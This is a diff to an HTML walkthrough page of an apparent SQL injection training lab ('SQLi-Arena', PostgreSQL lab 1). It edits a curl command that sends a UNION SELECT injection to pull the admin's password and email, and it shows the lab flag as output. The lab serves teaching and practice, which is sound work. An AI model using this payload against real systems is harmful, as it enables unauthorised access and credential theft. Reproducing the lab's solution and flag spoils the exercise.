@@ -143,7 +143,7 @@
         <span class="terminal-title">curl. Full Exploit</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab1" \<br> --data-urlencode "username=' UNION SELECT id, password, email FROM users WHERE username='admin' --"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab1" \<br> --data-urlencode "username=' UNION SELECT id, password, email FROM users WHERE username='admin' --"<br><br>
         <span class="prompt">Output:</span><br>
         <strong>ID:</strong> 1 &bull; <strong>Username:</strong> FLAG{pg_un10n_b4s1c_str1ng} &bull; <strong>Email:</strong> admin@sqli-arena.local
     </div>
